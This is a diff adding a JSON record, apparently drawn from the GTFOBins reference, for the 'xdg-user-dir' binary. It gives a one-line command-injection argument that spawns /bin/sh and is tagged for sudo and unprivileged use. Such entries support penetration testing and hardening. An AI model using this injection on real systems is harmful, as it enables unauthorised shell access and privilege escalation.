@@ -1,0 +1,1 @@
+{"title": "xdg-user-dir", "source": "gtfobins", "source_label": "GTFOBins", "path": "xdg-user-dir", "html": "<h1>xdg-user-dir</h1>\n<h2>Shell</h2>\n<pre><code class=\"language-bash\">xdg-user-dir &#x27;}; /bin/sh #&#x27;</code></pre>", "excerpt": "xdg-user-dir Shell xdg-user-dir &#x27;}; /bin/sh #&#x27;", "tags": ["func:shell", "ctx:sudo", "ctx:unprivileged"]}
